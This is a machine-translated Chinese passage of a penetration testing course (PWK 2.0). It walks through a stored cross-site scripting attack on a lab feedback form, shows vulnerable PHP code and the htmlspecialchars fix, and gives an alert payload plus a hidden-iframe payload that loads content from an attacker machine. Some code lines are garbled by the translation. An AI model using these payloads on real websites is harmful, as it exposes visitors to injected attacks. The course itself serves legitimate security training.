<div style="position:absolute;top:93022;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 285 - HTML 和 JavaScript 的特殊字符</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来描述这些特殊字符的用途。</font><font style="vertical-align: inherit;">HTML 使用“&lt;”和“&gt;”来表示</font></font></nobr></div>
<div style="position:absolute;top:93071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">元素，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">262</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构成 HTML 文档的各种组件。</font><font style="vertical-align: inherit;">JavaScript 使用“{”和“}”</font></font></nobr></div>
<div style="position:absolute;top:93090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在函数声明中。</font><font style="vertical-align: inherit;">单 (') 和双 (") 引号用于表示字符串和分号</font></font></nobr></div>
<div style="position:absolute;top:93109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(;) 用于标记语句的结束。</font></font></nobr></div>
<div style="position:absolute;top:93142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果应用程序不删除或编码这些字符，它可能容易受到 XSS 攻击，因为</font></font></nobr></div>
<div style="position:absolute;top:93161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符可用于将代码引入页面。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:93224;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然有多种类型的编码，但我们最会遇到的</font></font></i></nobr></div>
<div style="position:absolute;top:93243;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常在 web 应用程序中是 HTML 编码</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">263</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 URL 编码。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">264</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网址</font></font></i></nobr></div>
<div style="position:absolute;top:93262;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码，有时也称为百分比编码，用于转换非</font></font></i></nobr></div>
<div style="position:absolute;top:93282;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL 中的 ASCII 字符，例如将空格转换为“%20”。</font></font></i></nobr></div>
<div style="position:absolute;top:93328;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML 编码（或字符引用）可用于显示</font></font></i></nobr></div>
<div style="position:absolute;top:93347;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常具有特殊含义，例如标签元素。</font><font style="vertical-align: inherit;">例如，“&lt;” </font><font style="vertical-align: inherit;">是个</font></font></i></nobr></div>
<div style="position:absolute;top:93367;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“&lt;”的字符参考。</font><font style="vertical-align: inherit;">当遇到这种类型的编码时，浏览器</font></font></i></nobr></div>
<div style="position:absolute;top:93386;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会将字符解释为元素的开始，但会显示</font></font></i></nobr></div>
<div style="position:absolute;top:93406;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际字符原样。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们可以将这些特殊字符注入到页面中，浏览器会将它们视为代码</font></font></nobr></div>
<div style="position:absolute;top:93487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">元素。</font><font style="vertical-align: inherit;">然后我们可以开始构建将在受害者浏览器中执行的代码。</font></font></nobr></div>
<div style="position:absolute;top:93520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据包含输入的位置，我们可能需要不同的字符集。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:93539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，如果我们的输入被添加到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">div</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标签</font><font style="vertical-align: inherit;">之间</font><font style="vertical-align: inherit;">，我们将需要包含我们自己的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本标签</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">265</font></font></font></nobr></div>
<div style="position:absolute;top:93558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且需要能够注入“&lt;”和“&gt;”作为有效载荷的一部分。</font><font style="vertical-align: inherit;">如果我们的输入被添加到</font></font></nobr></div>
<div style="position:absolute;top:93578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个现有的 JavaScript 标签，我们可能只需要引号和分号来添加我们自己的代码。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:93612;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.2 基本 XSS</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们通过对我们的 Windows 10 实验室机器的简单攻击来演示基本的 XSS。</font></font></nobr></div>
<div style="position:absolute;top:93679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回到在我们的 Windows 10 实验室机器的端口 80 上运行的 Web 应用程序，我们将开始</font></font></nobr></div>
<div style="position:absolute;top:93699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过启动 Apache 和 MySQL（通过我们之前所做的 XAMPP）并浏览主网页：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:93839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">262 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/HTML_element</font></font></font></nobr></div>
<div style="position:absolute;top:93859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">263 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references</font></font></font></nobr></div>
<div style="position:absolute;top:93879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">264 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Percent-encoding</font></font></font></nobr></div>
<div style="position:absolute;top:93899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">265 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019 年），https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:94027;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="80"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 80 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:94060;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:95137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:95137;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:95137;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">300</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94374;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 143：炸玉米饼。</font><font style="vertical-align: inherit;">美味的炸玉米饼。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该应用程序包含多个缺陷，包括存储型 XSS 漏洞。</font><font style="vertical-align: inherit;">为了证明这一点，</font></font></nobr></div>
<div style="position:absolute;top:94425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以在反馈表单字段中插入一些特殊字符并提交它们。</font><font style="vertical-align: inherit;">我们将开始</font></font></nobr></div>
<div style="position:absolute;top:94444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过提交一些 JavaScript 特定的字符：双引号 (“)、分号 (;)、”&lt;“、</font></font></nobr></div>
<div style="position:absolute;top:94464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和”&gt;”：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94876;left:381"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 144：XSS 测试 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:95215;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="81"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 81 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:95248;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:96325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:96325;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:96325;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">301</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:95338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.2.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Inspector 工具中查看生成的消息，我们可以看到我们的角色不是</font></font></nobr></div>
<div style="position:absolute;top:95378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除或编码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95966;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 145：查看提交的反馈</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于输入没有被过滤或消毒，我们的特殊字符已经传递到</font></font></nobr></div>
<div style="position:absolute;top:96016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出，条件看起来很适合 XSS 漏洞。</font><font style="vertical-align: inherit;">让我们检查源代码以更好地</font></font></nobr></div>
<div style="position:absolute;top:96035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解正在发生的事情。</font></font></nobr></div>
<div style="position:absolute;top:96068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当反馈提交给网站时，由以下代码处理：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36 &lt;?php</font></font></nobr></div>
<div style="position:absolute;top:96120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37 包含“database.php”；</font></font></nobr></div>
<div style="position:absolute;top:96137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38 $sql =“插入反馈（名称，文本）值（？，？）”；</font></font></nobr></div>
<div style="position:absolute;top:96154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39 $stmt = $conn-&gt;prepare($sql);</font></font></nobr></div>
<div style="position:absolute;top:96171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40      </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$stmt-&gt;bind_param("ss", $_POST['name'], $_POST['comment']);</font></font></font></b></nobr></div>
<div style="position:absolute;top:96188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41 $stmt-&gt;执行（）；</font></font></nobr></div>
<div style="position:absolute;top:96205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42 ?&gt;</font></font></nobr></div>
<div style="position:absolute;top:96224;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 286 - submitFeedback.php 中的代码摘录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 286 中的第 40 行处理发布到</font></font></nobr></div>
<div style="position:absolute;top:96273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font><font style="vertical-align: inherit;">该代码将这些值插入到数据库中而无需任何修改。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:96403;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="82"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 82 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:96436;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:97513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:97513;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:97513;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">302</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将检查在网站上显示反馈的代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38 &lt;?php</font></font></nobr></div>
<div style="position:absolute;top:96584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39 包含“database.php”；</font></font></nobr></div>
<div style="position:absolute;top:96601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40 $sql = "选择名称，来自反馈的文本";</font></font></nobr></div>
<div style="position:absolute;top:96618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41 $result = $conn-&gt;query($sql);</font></font></nobr></div>
<div style="position:absolute;top:96634;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42 如果 ($result-&gt;num_rows &gt; 0) {</font></font></nobr></div>
<div style="position:absolute;top:96651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43    </font></font></nobr></div>
<div style="position:absolute;top:96651;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while($row = $result-&gt;fetch_assoc()) {</font></font></nobr></div>
<div style="position:absolute;top:96668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:96668;left:238"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声 "&lt;tr&gt;&lt;td&gt; " 。</font><font style="vertical-align: inherit;">$row["名称"]。</font><font style="vertical-align: inherit;">"&lt;/td&gt;&lt;td&gt;" 。</font><font style="vertical-align: inherit;">$row["文本"]。</font><font style="vertical-align: inherit;">"&lt;/td&gt;&lt;/t</font></font></b></nobr></div>
<div style="position:absolute;top:96685;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">r&gt;";</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45    </font></font></nobr></div>
<div style="position:absolute;top:96703;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:96719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46 } else { echo "没有结果:("; }</font></font></nobr></div>
<div style="position:absolute;top:96736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47    </font></font></nobr></div>
<div style="position:absolute;top:96753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48 ?&gt;</font></font></nobr></div>
<div style="position:absolute;top:96772;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 287 - 来自feedback.php 的代码摘录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">287 中的第 44 行将数据库中的结果写入页面。</font><font style="vertical-align: inherit;">结果确实是输出</font></font></nobr></div>
<div style="position:absolute;top:96822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有任何修改。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:96884;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该在哪里清理数据？</font><font style="vertical-align: inherit;">提交时还是显示时？</font><font style="vertical-align: inherit;">理想情况下，</font></font></i></nobr></div>
<div style="position:absolute;top:96903;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据将在两个地方进行清理。</font><font style="vertical-align: inherit;">对这两个地方进行消毒将是一个</font></font></i></nobr></div>
<div style="position:absolute;top:96922;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纵深防御的例子，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">266</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">倡导的安全实践和原则</font></font></i></nobr></div>
<div style="position:absolute;top:96941;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在任何可能的地方添加防御层。</font><font style="vertical-align: inherit;">这往往会产生更健壮的</font></font></i></nobr></div>
<div style="position:absolute;top:96961;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序。</font><font style="vertical-align: inherit;">但是，如果只在一处进行消毒，则应该</font></font></i></nobr></div>
<div style="position:absolute;top:96980;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">始终如一地应用。</font><font style="vertical-align: inherit;">在 PHP 中，htmlspecialchars </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">267</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数可用于</font></font></i></nobr></div>
<div style="position:absolute;top:96999;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在显示字符串之前将关键字符转换为 HTML 实体。</font><font style="vertical-align: inherit;">使用这个</font></font></i></nobr></div>
<div style="position:absolute;top:97019;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们查看的任何一个 PHP 文件中的函数都有助于防止这种 XSS</font></font></i></nobr></div>
<div style="position:absolute;top:97038;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脆弱性。</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:97443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">266 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Defense_in_depth_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（计算）</font></font></font></nobr></div>
<div style="position:absolute;top:97463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">267 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PHP 集团，2019 年），https://php.net/manual/en/function.htmlspecialchars.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:97591;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="83"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 83 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:97624;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:98701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:98701;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:98701;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">303</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:97714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.2.2</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们更新我们的输入并创建一个显示简单</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Javascript 警报</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的有效负载</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">基于</font></font></nobr></div>
<div style="position:absolute;top:97754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们查看了代码，我们可以看到我们的消息被插入到一个 HTML 表格单元格中。</font><font style="vertical-align: inherit;">我们不</font></font></nobr></div>
<div style="position:absolute;top:97773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里需要任何花哨的编码技巧，只需要一个基本的 XSS 负载，比如“&lt;script&gt;alert('XSS')&lt;/script&gt;”。</font></font></nobr></div>
<div style="position:absolute;top:97793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们现在插入。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98238;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 146：提交 XSS Payload </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:98779;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="84"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 84 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:98812;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:99889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:99889;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:99889;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">304</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:98902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.2.3</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提交我们的有效负载后，刷新反馈页面应该执行我们注入的 JavaScript：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99284;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 147：查看页面时执行的 JavaScript</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">我们已将跨站点脚本负载注入到 Web 应用程序的数据库中，并且</font></font></nobr></div>
<div style="position:absolute;top:99334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它将提供给查看该站点的任何人。</font><font style="vertical-align: inherit;">一个简单的警报窗口是一个有点微不足道的例子</font></font></nobr></div>
<div style="position:absolute;top:99353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跨站点脚本可以做什么，让我们尝试一些更有趣的事情。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:99388;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.3 内容注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XSS 漏洞通常用于提供客户端攻击，因为它们允许重定向</font></font></nobr></div>
<div style="position:absolute;top:99442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受害者的浏览器到攻击者选择的位置。</font><font style="vertical-align: inherit;">重定向的隐蔽替代方法是</font></font></nobr></div>
<div style="position:absolute;top:99461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将如下所示的不可见</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iframe </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">268</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注入</font><font style="vertical-align: inherit;">到我们的 XSS 负载中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;iframe src=http://10.11.0.4/report height=”0” width=”0”&gt;&lt;/iframe&gt;</font></font></nobr></div>
<div style="position:absolute;top:99515;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 288 - 使用 iframe 传递 XSS 负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iframe 用于在当前文件中嵌入另一个文件，例如图像或另一个 HTML 文件</font></font></nobr></div>
<div style="position:absolute;top:99564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML 文档。</font><font style="vertical-align: inherit;">在我们的例子中，“report”是一个超链接到我们的攻击机器的文件，iframe 是</font></font></nobr></div>
